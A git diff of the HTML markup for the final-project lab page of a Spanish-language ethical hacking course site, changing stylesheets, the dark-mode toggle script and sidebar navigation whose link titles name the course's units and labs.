@@ -6,8 +6,9 @@
 
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
 
+<meta name="description" content="Curso de Ethical Hacking 2026">
 
-<title>17&nbsp; Lab 8 — Proyecto Final: Pentest End-to-End – Ethical Hacking 2026</title>
+<title>Lab 8 — Proyecto Final: Pentest End-to-End – Ethical Hacking 2026</title>
 <style>
 /* Default styles provided by pandoc.
 ** See https://pandoc.org/MANUAL.html#variables-for-html for config info.
@@ -70,16 +71,21 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
 <meta name="quarto:offset" content="../">
 <link href="../quizzes/unidad1.html" rel="next">
 <link href="../labs/lab-unidad7.html" rel="prev">
+<link href="../images/hacking.png" rel="icon" type="image/png">
 <script src="../site_libs/quarto-html/quarto.js" type="module"></script>
 <script src="../site_libs/quarto-html/tabsets/tabsets.js" type="module"></script>
 <script src="../site_libs/quarto-html/popper.min.js"></script>
 <script src="../site_libs/quarto-html/tippy.umd.min.js"></script>
 <script src="../site_libs/quarto-html/anchor.min.js"></script>
 <link href="../site_libs/quarto-html/tippy.css" rel="stylesheet">
-<link href="../site_libs/quarto-html/quarto-syntax-highlighting-dark-68056a18e515a5789c5e26a7aeb7ac61.css" rel="stylesheet" id="quarto-text-highlighting-styles">
+<link href="../site_libs/quarto-html/quarto-syntax-highlighting-61780a260fdcf47536a34fde95582725.css" rel="stylesheet" class="quarto-color-scheme" id="quarto-text-highlighting-styles">
+<link href="../site_libs/quarto-html/quarto-syntax-highlighting-dark-68056a18e515a5789c5e26a7aeb7ac61.css" rel="stylesheet" class="quarto-color-scheme quarto-color-alternate" id="quarto-text-highlighting-styles">
+<link href="../site_libs/quarto-html/quarto-syntax-highlighting-61780a260fdcf47536a34fde95582725.css" rel="stylesheet" class="quarto-color-scheme-extra" id="quarto-text-highlighting-styles">
 <script src="../site_libs/bootstrap/bootstrap.min.js"></script>
 <link href="../site_libs/bootstrap/bootstrap-icons.css" rel="stylesheet">
-<link href="../site_libs/bootstrap/bootstrap-9265db7866925a9d8c3a929a182b61d8.min.css" rel="stylesheet" append-hash="true" id="quarto-bootstrap" data-mode="dark">
+<link href="../site_libs/bootstrap/bootstrap-87aed0b8589e23e45aa8556edf37a91b.min.css" rel="stylesheet" append-hash="true" class="quarto-color-scheme" id="quarto-bootstrap" data-mode="light">
+<link href="../site_libs/bootstrap/bootstrap-dark-d475e4ab3b4fd243dd6ecd26d4f0399c.min.css" rel="stylesheet" append-hash="true" class="quarto-color-scheme quarto-color-alternate" id="quarto-bootstrap" data-mode="dark">
+<link href="../site_libs/bootstrap/bootstrap-87aed0b8589e23e45aa8556edf37a91b.min.css" rel="stylesheet" append-hash="true" class="quarto-color-scheme-extra" id="quarto-bootstrap" data-mode="light">
 <script id="quarto-search-options" type="application/json">{
   "location": "sidebar",
   "copy-button": false,
@@ -109,9 +115,171 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
 }</script>
 
 
+<link rel="stylesheet" href="../css/styles.css">
+<link rel="stylesheet" href="../custom.css">
 </head>
 
-<body class="nav-sidebar floating quarto-light">
+<body class="nav-sidebar floating quarto-dark"><script id="quarto-html-before-body" type="application/javascript">
+    const toggleBodyColorMode = (bsSheetEl) => {
+      const mode = bsSheetEl.getAttribute("data-mode");
+      const bodyEl = window.document.querySelector("body");
+      if (mode === "dark") {
+        bodyEl.classList.add("quarto-dark");
+        bodyEl.classList.remove("quarto-light");
+      } else {
+        bodyEl.classList.add("quarto-light");
+        bodyEl.classList.remove("quarto-dark");
+      }
+    }
+    const toggleBodyColorPrimary = () => {
+      const bsSheetEl = window.document.querySelector("link#quarto-bootstrap:not([rel=disabled-stylesheet])");
+      if (bsSheetEl) {
+        toggleBodyColorMode(bsSheetEl);
+      }
+    }
+    const setColorSchemeToggle = (alternate) => {
+      const toggles = window.document.querySelectorAll('.quarto-color-scheme-toggle');
+      for (let i=0; i < toggles.length; i++) {
+        const toggle = toggles[i];
+        if (toggle) {
+          if (alternate) {
+            toggle.classList.add("alternate");
+          } else {
+            toggle.classList.remove("alternate");
+          }
+        }
+      }
+    };
+    const toggleColorMode = (alternate) => {
+      // Switch the stylesheets
+      const primaryStylesheets = window.document.querySelectorAll('link.quarto-color-scheme:not(.quarto-color-alternate)');
+      const alternateStylesheets = window.document.querySelectorAll('link.quarto-color-scheme.quarto-color-alternate');
+      manageTransitions('#quarto-margin-sidebar .nav-link', false);
+      if (alternate) {
+        // note: dark is layered on light, we don't disable primary!
+        enableStylesheet(alternateStylesheets);
+        for (const sheetNode of alternateStylesheets) {
+          if (sheetNode.id === "quarto-bootstrap") {
+            toggleBodyColorMode(sheetNode);
+          }
+        }
+      } else {
+        disableStylesheet(alternateStylesheets);
+        enableStylesheet(primaryStylesheets)
+        toggleBodyColorPrimary();
+      }
+      manageTransitions('#quarto-margin-sidebar .nav-link', true);
+      // Switch the toggles
+      setColorSchemeToggle(alternate)
+      // Hack to workaround the fact that safari doesn't
+      // properly recolor the scrollbar when toggling (#1455)
+      if (navigator.userAgent.indexOf('Safari') > 0 && navigator.userAgent.indexOf('Chrome') == -1) {
+        manageTransitions("body", false);
+        window.scrollTo(0, 1);
+        setTimeout(() => {
+          window.scrollTo(0, 0);
+          manageTransitions("body", true);
+        }, 40);
+      }
+    }
+    const disableStylesheet = (stylesheets) => {
+      for (let i=0; i < stylesheets.length; i++) {
+        const stylesheet = stylesheets[i];
+        stylesheet.rel = 'disabled-stylesheet';
+      }
+    }
+    const enableStylesheet = (stylesheets) => {
+      for (let i=0; i < stylesheets.length; i++) {
+        const stylesheet = stylesheets[i];
+        if(stylesheet.rel !== 'stylesheet') { // for Chrome, which will still FOUC without this check
+          stylesheet.rel = 'stylesheet';
+        }
+      }
+    }
+    const manageTransitions = (selector, allowTransitions) => {
+      const els = window.document.querySelectorAll(selector);
+      for (let i=0; i < els.length; i++) {
+        const el = els[i];
+        if (allowTransitions) {
+          el.classList.remove('notransition');
+        } else {
+          el.classList.add('notransition');
+        }
+      }
+    }
+    const isFileUrl = () => {
+      return window.location.protocol === 'file:';
+    }
+    const hasAlternateSentinel = () => {
+      let styleSentinel = getColorSchemeSentinel();
+      if (styleSentinel !== null) {
+        return styleSentinel === "alternate";
+      } else {
+        return false;
+      }
+    }
+    const setStyleSentinel = (alternate) => {
+      const value = alternate ? "alternate" : "default";
+      if (!isFileUrl()) {
+        window.localStorage.setItem("quarto-color-scheme", value);
+      } else {
+        localAlternateSentinel = value;
+      }
+    }
+    const getColorSchemeSentinel = () => {
+      if (!isFileUrl()) {
+        const storageValue = window.localStorage.getItem("quarto-color-scheme");
+        return storageValue != null ? storageValue : localAlternateSentinel;
+      } else {
+        return localAlternateSentinel;
+      }
+    }
+    const toggleGiscusIfUsed = (isAlternate, darkModeDefault) => {
+      const baseTheme = document.querySelector('#giscus-base-theme')?.value ?? 'light';
+      const alternateTheme = document.querySelector('#giscus-alt-theme')?.value ?? 'dark';
+      let newTheme = '';
+      if(authorPrefersDark) {
+        newTheme = isAlternate ? baseTheme : alternateTheme;
+      } else {
+        newTheme = isAlternate ? alternateTheme : baseTheme;
+      }
+      const changeGiscusTheme = () => {
+        // From: https://github.com/giscus/giscus/issues/336
+        const sendMessage = (message) => {
+          const iframe = document.querySelector('iframe.giscus-frame');
+          if (!iframe) return;
+          iframe.contentWindow.postMessage({ giscus: message }, 'https://giscus.app');
+        }
+        sendMessage({
+          setConfig: {
+            theme: newTheme
+          }
+        });
+      }
+      const isGiscussLoaded = window.document.querySelector('iframe.giscus-frame') !== null;
+      if (isGiscussLoaded) {
+        changeGiscusTheme();
+      }
+    };
+    const authorPrefersDark = true;
+    const darkModeDefault = authorPrefersDark;
+    let localAlternateSentinel = darkModeDefault ? 'alternate' : 'default';
+    // Dark / light mode switch
+    window.quartoToggleColorScheme = () => {
+      // Read the current dark / light value
+      let toAlternate = !hasAlternateSentinel();
+      toggleColorMode(toAlternate);
+      setStyleSentinel(toAlternate);
+      toggleGiscusIfUsed(toAlternate, darkModeDefault);
+      window.dispatchEvent(new Event('resize'));
+    };
+    // Switch to dark mode if need be
+    if (hasAlternateSentinel()) {
+      toggleColorMode(true);
+    } else {
+      toggleColorMode(false);
+    }
+  </script>
 
 <div id="quarto-search-results"></div>
   <header id="quarto-header" class="headroom fixed-top">
@@ -120,7 +288,7 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
       <button type="button" class="quarto-btn-toggle btn" data-bs-toggle="collapse" role="button" data-bs-target=".quarto-sidebar-collapse-item" aria-controls="quarto-sidebar" aria-expanded="false" aria-label="Toggle sidebar navigation" onclick="if (window.quartoToggleHeadroom) { window.quartoToggleHeadroom(); }">
         <i class="bi bi-layout-text-sidebar-reverse"></i>
       </button>
-        <nav class="quarto-page-breadcrumbs" aria-label="breadcrumb"><ol class="breadcrumb"><li class="breadcrumb-item"><a href="../labs/lab-unidad1.html">Laboratorios</a></li><li class="breadcrumb-item"><a href="../labs/lab-unidad8.html"><span class="chapter-number">17</span>&nbsp; <span class="chapter-title">Lab 8 — Proyecto Final: Pentest End-to-End</span></a></li></ol></nav>
+        <nav class="quarto-page-breadcrumbs" aria-label="breadcrumb"><ol class="breadcrumb"><li class="breadcrumb-item"><a href="../labs/lab-unidad1.html">Laboratorios</a></li><li class="breadcrumb-item"><a href="../labs/lab-unidad8.html"><span class="chapter-title">Lab 8 — Proyecto Final: Pentest End-to-End</span></a></li></ol></nav>
         <a class="flex-grow-1" role="navigation" data-bs-toggle="collapse" data-bs-target=".quarto-sidebar-collapse-item" aria-controls="quarto-sidebar" aria-expanded="false" aria-label="Toggle sidebar navigation" onclick="if (window.quartoToggleHeadroom) { window.quartoToggleHeadroom(); }">      
         </a>
       <button type="button" class="btn quarto-search-button" aria-label="Search" onclick="window.quartoOpenSearch();">
@@ -133,9 +301,50 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
 <div id="quarto-content" class="quarto-container page-columns page-rows-contents page-layout-article">
 <!-- sidebar -->
   <nav id="quarto-sidebar" class="sidebar collapse collapse-horizontal quarto-sidebar-collapse-item sidebar-navigation floating overflow-auto">
-    <div class="pt-lg-2 mt-2 text-left sidebar-header">
+    <div class="pt-lg-2 mt-2 text-left sidebar-header sidebar-header-stacked">
+      <a href="../index.html" class="sidebar-logo-link">
+      <img src="../images/hacking.png" alt="" class="sidebar-logo light-content py-0 d-lg-inline d-none">
+      <img src="../images/hacking.png" alt="" class="sidebar-logo dark-content py-0 d-lg-inline d-none">
+      </a>
     <div class="sidebar-title mb-0 py-0">
       <a href="../">Ethical Hacking 2026</a> 
+        <div class="sidebar-tools-main tools-wide">
+    <div class="dropdown">
+      <a href="" title="Download" id="quarto-navigation-tool-dropdown-0" class="quarto-navigation-tool dropdown-toggle px-1" data-bs-toggle="dropdown" aria-expanded="false" role="link" aria-label="Download"><i class="bi bi-download"></i></a>
+      <ul class="dropdown-menu" aria-labelledby="quarto-navigation-tool-dropdown-0">
+          <li>
+            <a class="dropdown-item sidebar-tools-main-item" href="../ethical_hacking_2026.pdf">
+              <i class="bi bi-file-pdf pe-1"></i>
+            Download PDF
+            </a>
+          </li>
+          <li>
+            <a class="dropdown-item sidebar-tools-main-item" href="../ethical_hacking_2026.epub">
+              <i class="bi bi-journal pe-1"></i>
+            Download ePub
+            </a>
+          </li>
+      </ul>
+    </div>
+    <div class="dropdown">
+      <a href="" title="Share" id="quarto-navigation-tool-dropdown-1" class="quarto-navigation-tool dropdown-toggle px-1" data-bs-toggle="dropdown" aria-expanded="false" role="link" aria-label="Share"><i class="bi bi-share"></i></a>
+      <ul class="dropdown-menu" aria-labelledby="quarto-navigation-tool-dropdown-1">
+          <li>
+            <a class="dropdown-item sidebar-tools-main-item" href="https://twitter.com/intent/tweet?url=|url|">
+              <i class="bi bi-twitter pe-1"></i>
+            Twitter
+            </a>
+          </li>
+          <li>
+            <a class="dropdown-item sidebar-tools-main-item" href="https://www.linkedin.com/sharing/share-offsite/?url=|url|">
+              <i class="bi bi-linkedin pe-1"></i>
+            LinkedIn
+            </a>
+          </li>
+      </ul>
+    </div>
+  <a href="" class="quarto-color-scheme-toggle quarto-navigation-tool  px-1" onclick="window.quartoToggleColorScheme(); return false;" title="Toggle dark mode"><i class="bi"></i></a>
+</div>
     </div>
       </div>
         <div class="mt-2 flex-shrink-0 align-items-center">
@@ -147,65 +356,56 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
     <ul class="list-unstyled mt-1">
         <li class="sidebar-item">
   <div class="sidebar-item-container"> 
-  <a href="../index.html" class="sidebar-item-text sidebar-link">
- <span class="menu-text"><span class="chapter-number">1</span>&nbsp; <span class="chapter-title">Ethical Hacking 2026 - ABACOM</span></span></a>
+  <a href="../index.html" class="sidebar-item-text sidebar-link"><span class="chapter-title">Ethical Hacking 2026 - ABACOM</span></a>
   </div>
 </li>
         <li class="sidebar-item sidebar-item-section">
       <div class="sidebar-item-container"> 
-            <a class="sidebar-item-text sidebar-link text-start" data-bs-toggle="collapse" data-bs-target="#quarto-sidebar-section-1" role="navigation" aria-expanded="true">
+            <a class="sidebar-item-text sidebar-link text-start collapsed" data-bs-toggle="collapse" data-bs-target="#quarto-sidebar-section-1" role="navigation" aria-expanded="false">
  <span class="menu-text">Contenido</span></a>
-          <a class="sidebar-item-toggle text-start" data-bs-toggle="collapse" data-bs-target="#quarto-sidebar-section-1" role="navigation" aria-expanded="true" aria-label="Toggle section">
+          <a class="sidebar-item-toggle text-start collapsed" data-bs-toggle="collapse" data-bs-target="#quarto-sidebar-section-1" role="navigation" aria-expanded="false" aria-label="Toggle section">
             <i class="bi bi-chevron-right ms-2"></i>
           </a> 
       </div>
-      <ul id="quarto-sidebar-section-1" class="collapse list-unstyled sidebar-section depth1 show">  
+      <ul id="quarto-sidebar-section-1" class="collapse list-unstyled sidebar-section depth1 ">  
           <li class="sidebar-item">
   <div class="sidebar-item-container"> 
-  <a href="../contenido/unidad1.html" class="sidebar-item-text sidebar-link">
- <span class="menu-text"><span class="chapter-number">2</span>&nbsp; <span class="chapter-title">Unidad 1: Fundamentos y Reconocimiento Agéntico</span></span></a>
+  <a href="../contenido/unidad1.html" class="sidebar-item-text sidebar-link"><span class="chapter-title">Unidad 1: Fundamentos y Reconocimiento Agéntico</span></a>
   </div>
 </li>
           <li class="sidebar-item">
   <div class="sidebar-item-container"> 
-  <a href="../contenido/unidad2.html" class="sidebar-item-text sidebar-link">
- <span class="menu-text"><span class="chapter-number">3</span>&nbsp; <span class="chapter-title">🤖 Unidad 2: Vulnerabilidades en IA y Modelos de Lenguaje</span></span></a>
+  <a href="../contenido/unidad2.html" class="sidebar-item-text sidebar-link"><span class="chapter-title">🤖 Unidad 2: Vulnerabilidades en IA y Modelos de Lenguaje</span></a>
   </div>
 </li>
           <li class="sidebar-item">
   <div class="sidebar-item-container"> 
-  <a href="../contenido/unidad3.html" class="sidebar-item-text sidebar-link">
- <span class="menu-text"><span class="chapter-number">4</span>&nbsp; <span class="chapter-title">Unidad 3: Explotación Web y APIs 2026 🕷️</span></span></a>
+  <a href="../contenido/unidad3.html" class="sidebar-item-text sidebar-link"><span class="chapter-title">Unidad 3: Explotación Web y APIs 2026 🕷️</span></a>
   </div>
 </li>
           <li class="sidebar-item">
   <div class="sidebar-item-container"> 
-  <a href="../contenido/unidad4.html" class="sidebar-item-text sidebar-link">
- <span class="menu-text"><span class="chapter-number">5</span>&nbsp; <span class="chapter-title">🔐 Unidad 4: Hacking de Identidad y AD Moderno</span></span></a>
+  <a href="../contenido/unidad4.html" class="sidebar-item-text sidebar-link"><span class="chapter-title">🔐 Unidad 4: Hacking de Identidad y AD Moderno</span></a>
   </div>
 </li>
           <li class="sidebar-item">
   <div class="sidebar-item-container"> 
-  <a href="../contenido/unidad5.html" class="sidebar-item-text sidebar-link">
- <span class="menu-text"><span class="chapter-number">6</span>&nbsp; <span class="chapter-title">🚀 Unidad 5: Pentesting Autónomo y Red Teaming Agéntico</span></span></a>
+  <a href="../contenido/unidad5.html" class="sidebar-item-text sidebar-link"><span class="chapter-title">🚀 Unidad 5: Pentesting Autónomo y Red Teaming Agéntico</span></a>
   </div>
 </li>
           <li class="sidebar-item">
   <div class="sidebar-item-container"> 
-  <a href="../contenido/unidad6.html" class="sidebar-item-text sidebar-link">
- <span class="menu-text"><span class="chapter-number">7</span>&nbsp; <span class="chapter-title">🛡️ Unidad 6: Evasión de Defensas</span></span></a>
+  <a href="../contenido/unidad6.html" class="sidebar-item-text sidebar-link"><span class="chapter-title">🛡️ Unidad 6: Evasión de Defensas</span></a>
   </div>
 </li>
           <li class="sidebar-item">
   <div class="sidebar-item-container"> 
-  <a href="../contenido/unidad7.html" class="sidebar-item-text sidebar-link">
- <span class="menu-text"><span class="chapter-number">8</span>&nbsp; <span class="chapter-title">🏭 Unidad 7: Ciberseguridad Industrial</span></span></a>
+  <a href="../contenido/unidad7.html" class="sidebar-item-text sidebar-link"><span class="chapter-title">🏭 Unidad 7: Ciberseguridad Industrial</span></a>
   </div>
 </li>
           <li class="sidebar-item">
   <div class="sidebar-item-container"> 
-  <a href="../contenido/unidad8.html" class="sidebar-item-text sidebar-link">
- <span class="menu-text"><span class="chapter-number">9</span>&nbsp; <span class="chapter-title">🎯 Unidad 8: Post-Explotación, Reporte y Ética</span></span></a>
+  <a href="../contenido/unidad8.html" class="sidebar-item-text sidebar-link"><span class="chapter-title">🎯 Unidad 8: Post-Explotación, Reporte y Ética</span></a>
   </div>
 </li>
       </ul>
@@ -221,148 +421,138 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
       <ul id="quarto-sidebar-section-2" class="collapse list-unstyled sidebar-section depth1 show">  
           <li class="sidebar-item">
   <div class="sidebar-item-container"> 
-  <a href="../labs/lab-unidad1.html" class="sidebar-item-text sidebar-link">
- <span class="menu-text"><span class="chapter-number">10</span>&nbsp; <span class="chapter-title">Lab 1: Reconocimiento y Enumeración</span></span></a>
+  <a href="../labs/lab-unidad1.html" class="sidebar-item-text sidebar-link"><span class="chapter-title">Lab 1: Reconocimiento y Enumeración</span></a>
   </div>
 </li>
           <li class="sidebar-item">
   <div class="sidebar-item-container"> 
-  <a href="../labs/lab-unidad2.html" class="sidebar-item-text sidebar-link">
- <span class="menu-text"><span class="chapter-number">11</span>&nbsp; <span class="chapter-title">Lab 2: Prompt Injection y Jailbreaking en LLMs</span></span></a>
+  <a href="../labs/lab-unidad2.html" class="sidebar-item-text sidebar-link"><span class="chapter-title">Lab 2: Prompt Injection y Jailbreaking en LLMs</span></a>
   </div>
 </li>
           <li class="sidebar-item">
   <div class="sidebar-item-container"> 
-  <a href="../labs/lab-unidad3.html" class="sidebar-item-text sidebar-link">
- <span class="menu-text"><span class="chapter-number">12</span>&nbsp; <span class="chapter-title">Lab 3: Auditoría Web con OWASP WebGoat</span></span></a>
+  <a href="../labs/lab-unidad3.html" class="sidebar-item-text sidebar-link"><span class="chapter-title">Lab 3: Auditoría Web con OWASP WebGoat</span></a>
   </div>
 </li>
           <li class="sidebar-item">
   <div class="sidebar-item-container"> 
-  <a href="../labs/lab-unidad4.html" class="sidebar-item-text sidebar-link">
- <span class="menu-text"><span class="chapter-number">13</span>&nbsp; <span class="chapter-title">Lab 4: Active Directory - Kerberoasting y Pass-the-Hash</span></span></a>
+  <a href="../labs/lab-unidad4.html" class="sidebar-item-text sidebar-link"><span class="chapter-title">Lab 4: Active Directory - Kerberoasting y Pass-the-Hash</span></a>
   </div>
 </li>
           <li class="sidebar-item">
   <div class="sidebar-item-container"> 
-  <a href="../labs/lab-unidad5.html" class="sidebar-item-text sidebar-link">
- <span class="menu-text"><span class="chapter-number">14</span>&nbsp; <span class="chapter-title">Lab 5: Pentesting Autónomo con AutoRecon y Metasploit</span></span></a>
+  <a href="../labs/lab-unidad5.html" class="sidebar-item-text sidebar-link"><span class="chapter-title">Lab 5: Pentesting Autónomo con AutoRecon y Metasploit</span></a>
   </div>
 </li>
           <li class="sidebar-item">
   <div class="sidebar-item-container"> 
-  <a href="../labs/lab-unidad6.html" class="sidebar-item-text sidebar-link">
- <span class="menu-text"><span class="chapter-number">15</span>&nbsp; <span class="chapter-title">Lab 6: Desarrollo de Payload Indetectable</span></span></a>
+  <a href="../labs/lab-unidad6.html" class="sidebar-item-text sidebar-link"><span class="chapter-title">Lab 6: Desarrollo de Payload Indetectable</span></a>
   </div>
 </li>
           <li class="sidebar-item">
   <div class="sidebar-item-container"> 
-  <a href="../labs/lab-unidad7.html" class="sidebar-item-text sidebar-link">
- <span class="menu-text"><span class="chapter-number">16</span>&nbsp; <span class="chapter-title">Lab 7: Hardening y Pentesting de Sistemas OT</span></span></a>
+  <a href="../labs/lab-unidad7.html" class="sidebar-item-text sidebar-link"><span class="chapter-title">Lab 7: Hardening y Pentesting de Sistemas OT</span></a>
   </div>
 </li>
           <li class="sidebar-item">
   <div class="sidebar-item-container"> 
-  <a href="../labs/lab-unidad8.html" class="sidebar-item-text sidebar-link active">
- <span class="menu-text"><span class="chapter-number">17</span>&nbsp; <span class="chapter-title">Lab 8 — Proyecto Final: Pentest End-to-End</span></span></a>
+  <a href="../labs/lab-unidad8.html" class="sidebar-item-text sidebar-link active"><span class="chapter-title">Lab 8 — Proyecto Final: Pentest End-to-End</span></a>
   </div>
 </li>
       </ul>
   </li>
         <li class="sidebar-item sidebar-item-section">
       <div class="sidebar-item-container"> 
-            <a class="sidebar-item-text sidebar-link text-start" data-bs-toggle="collapse" data-bs-target="#quarto-sidebar-section-3" role="navigation" aria-expanded="true">
+            <a class="sidebar-item-text sidebar-link text-start collapsed" data-bs-toggle="collapse" data-bs-target="#quarto-sidebar-section-3" role="navigation" aria-expanded="false">
  <span class="menu-text">Evaluación</span></a>
-          <a class="sidebar-item-toggle text-start" data-bs-toggle="collapse" data-bs-target="#quarto-sidebar-section-3" role="navigation" aria-expanded="true" aria-label="Toggle section">
+          <a class="sidebar-item-toggle text-start collapsed" data-bs-toggle="collapse" data-bs-target="#quarto-sidebar-section-3" role="navigation" aria-expanded="false" aria-label="Toggle section">
             <i class="bi bi-chevron-right ms-2"></i>
           </a> 
       </div>
-      <ul id="quarto-sidebar-section-3" class="collapse list-unstyled sidebar-section depth1 show">  
+      <ul id="quarto-sidebar-section-3" class="collapse list-unstyled sidebar-section depth1 ">  
           <li class="sidebar-item">
   <div class="sidebar-item-container"> 
-  <a href="../quizzes/unidad1.html" class="sidebar-item-text sidebar-link">
- <span class="menu-text"><span class="chapter-number">18</span>&nbsp; <span class="chapter-title">Quiz Unidad 1: Fundamentos y Reconocimiento Agéntico</span></span></a>
+  <a href="../quizzes/unidad1.html" class="sidebar-item-text sidebar-link"><span class="chapter-title">Quiz Unidad 1: Fundamentos y Reconocimiento Agéntico</span></a>
   </div>
 </li>
           <li class="sidebar-item">
   <div class="sidebar-item-container"> 
-  <a href="../quizzes/unidad2.html" class="sidebar-item-text sidebar-link">
- <span class="menu-text"><span class="chapter-number">19</span>&nbsp; <span class="chapter-title">Quiz Unidad 2: Vulnerabilidades en IA y Modelos de Lenguaje</span></span></a>
+  <a href="../quizzes/unidad2.html" class="sidebar-item-text sidebar-link"><span class="chapter-title">Quiz Unidad 2: Vulnerabilidades en IA y Modelos de Lenguaje</span></a>
   </div>
 </li>
           <li class="sidebar-item">
   <div class="sidebar-item-container"> 
-  <a href="../quizzes/unidad3.html" class="sidebar-item-text sidebar-link">
- <span class="menu-text"><span class="chapter-number">20</span>&nbsp; <span class="chapter-title">Quiz Unidad 3: Explotación Web y APIs</span></span></a>
+  <a href="../quizzes/unidad3.html" class="sidebar-item-text sidebar-link"><span class="chapter-title">Quiz Unidad 3: Explotación Web y APIs</span></a>
   </div>
 </li>
           <li class="sidebar-item">
   <div class="sidebar-item-container"> 
-  <a href="../quizzes/unidad4.html" class="sidebar-item-text sidebar-link">
- <span class="menu-text"><span class="chapter-number">21</span>&nbsp; <span class="chapter-title">Quiz Unidad 4: Hacking de Identidad y AD</span></span></a>
+  <a href="../quizzes/unidad4.html" class="sidebar-item-text sidebar-link"><span class="chapter-title">Quiz Unidad 4: Hacking de Identidad y AD</span></a>
   </div>
 </li>
           <li class="sidebar-item">
   <div class="sidebar-item-container"> 
-  <a href="../quizzes/unidad5.html" class="sidebar-item-text sidebar-link">
- <span class="menu-text"><span class="chapter-number">22</span>&nbsp; <span class="chapter-title">Quiz Unidad 5: Pentesting Autónomo y Red Teaming</span></span></a>
+  <a href="../quizzes/unidad5.html" class="sidebar-item-text sidebar-link"><span class="chapter-title">Quiz Unidad 5: Pentesting Autónomo y Red Teaming</span></a>
   </div>
 </li>
           <li class="sidebar-item">
   <div class="sidebar-item-container"> 
-  <a href="../quizzes/unidad6.html" class="sidebar-item-text sidebar-link">
- <span class="menu-text"><span class="chapter-number">23</span>&nbsp; <span class="chapter-title">Quiz Unidad 6: Evasión de Defensas</span></span></a>
+  <a href="../quizzes/unidad6.html" class="sidebar-item-text sidebar-link"><span class="chapter-title">Quiz Unidad 6: Evasión de Defensas</span></a>
   </div>
 </li>
           <li class="sidebar-item">
   <div class="sidebar-item-container"> 
-  <a href="../quizzes/unidad7.html" class="sidebar-item-text sidebar-link">
- <span class="menu-text"><span class="chapter-number">24</span>&nbsp; <span class="chapter-title">Quiz Unidad 7: Ciberseguridad Industrial (OT/ICS)</span></span></a>
+  <a href="../quizzes/unidad7.html" class="sidebar-item-text sidebar-link"><span class="chapter-title">Quiz Unidad 7: Ciberseguridad Industrial (OT/ICS)</span></a>
   </div>
 </li>
           <li class="sidebar-item">
   <div class="sidebar-item-container"> 
-  <a href="../quizzes/unidad8.html" class="sidebar-item-text sidebar-link">
- <span class="menu-text"><span class="chapter-number">25</span>&nbsp; <span class="chapter-title">Quiz Unidad 8: Post-Explotación, Reporte y Ética</span></span></a>
+  <a href="../quizzes/unidad8.html" class="sidebar-item-text sidebar-link"><span class="chapter-title">Quiz Unidad 8: Post-Explotación, Reporte y Ética</span></a>
   </div>
 </li>
       </ul>
   </li>
         <li class="sidebar-item sidebar-item-section">
       <div class="sidebar-item-container"> 
-            <a class="sidebar-item-text sidebar-link text-start" data-bs-toggle="collapse" data-bs-target="#quarto-sidebar-section-4" role="navigation" aria-expanded="true">
+            <a class="sidebar-item-text sidebar-link text-start collapsed" data-bs-toggle="collapse" data-bs-target="#quarto-sidebar-section-4" role="navigation" aria-expanded="false">
  <span class="menu-text">Anexos</span></a>
-          <a class="sidebar-item-toggle text-start" data-bs-toggle="collapse" data-bs-target="#quarto-sidebar-section-4" role="navigation" aria-expanded="true" aria-label="Toggle section">
+          <a class="sidebar-item-toggle text-start collapsed" data-bs-toggle="collapse" data-bs-target="#quarto-sidebar-section-4" role="navigation" aria-expanded="false" aria-label="Toggle section">
             <i class="bi bi-chevron-right ms-2"></i>
           </a> 
       </div>
-      <ul id="quarto-sidebar-section-4" class="collapse list-unstyled sidebar-section depth1 show">  
+      <ul id="quarto-sidebar-section-4" class="collapse list-unstyled sidebar-section depth1 ">  
           <li class="sidebar-item">
   <div class="sidebar-item-container"> 
-  <a href="../anexos/anexo-bash-scripting.html" class="sidebar-item-text sidebar-link">
- <span class="menu-text"><span class="chapter-number">26</span>&nbsp; <span class="chapter-title">Anexo A: Minicurso de Bash Scripting</span></span></a>
+  <a href="../anexos/anexo-bash-scripting.html" class="sidebar-item-text sidebar-link"><span class="chapter-title">Anexo A: Minicurso de Bash Scripting</span></a>
   </div>
 </li>
           <li class="sidebar-item">
   <div class="sidebar-item-container"> 
-  <a href="../anexos/anexo-docker.html" class="sidebar-item-text sidebar-link">
- <span class="menu-text"><span class="chapter-number">27</span>&nbsp; <span class="chapter-title">Anexo B: Minicurso de Docker</span></span></a>
+  <a href="../anexos/anexo-docker.html" class="sidebar-item-text sidebar-link"><span class="chapter-title">Anexo B: Minicurso de Docker</span></a>
   </div>
 </li>
           <li class="sidebar-item">
   <div class="sidebar-item-container"> 
-  <a href="../anexos/anexo-maquinas-virtuales.html" class="sidebar-item-text sidebar-link">
- <span class="menu-text"><span class="chapter-number">28</span>&nbsp; <span class="chapter-title">Anexo C: Minicurso de Máquinas Virtuales con Kali Linux</span></span></a>
+  <a href="../anexos/anexo-maquinas-virtuales.html" class="sidebar-item-text sidebar-link"><span class="chapter-title">Anexo C: Minicurso de Máquinas Virtuales con Kali Linux</span></a>
   </div>
 </li>
           <li class="sidebar-item">
   <div class="sidebar-item-container"> 
-  <a href="../anexos/anexo-opencv-seguro.html" class="sidebar-item-text sidebar-link">
- <span class="menu-text"><span class="chapter-number">29</span>&nbsp; <span class="chapter-title">Configuración Segura de OpenCV</span></span></a>
+  <a href="../anexos/anexo-opencv-seguro.html" class="sidebar-item-text sidebar-link"><span class="chapter-title">Configuración Segura de OpenCV</span></a>
   </div>
 </li>
       </ul>
   </li>
+        <li class="sidebar-item">
+  <div class="sidebar-item-container"> 
+  <a href="../about.html" class="sidebar-item-text sidebar-link"><span class="chapter-title">Acerca del Curso</span></a>
+  </div>
+</li>
+        <li class="sidebar-item">
+  <div class="sidebar-item-container"> 
+  <a href="../license.html" class="sidebar-item-text sidebar-link"><span class="chapter-title">Licencia</span></a>
+  </div>
+</li>
     </ul>
     </div>
 </nav>
@@ -373,62 +563,62 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
     <h2 id="toc-title">Table of contents</h2>
    
   <ul>
-  <li><a href="#objetivo" id="toc-objetivo" class="nav-link active" data-scroll-target="#objetivo"><span class="header-section-number">17.1</span> Objetivo</a></li>
-  <li><a href="#prerrequisitos" id="toc-prerrequisitos" class="nav-link" data-scroll-target="#prerrequisitos"><span class="header-section-number">17.2</span> Prerrequisitos</a></li>
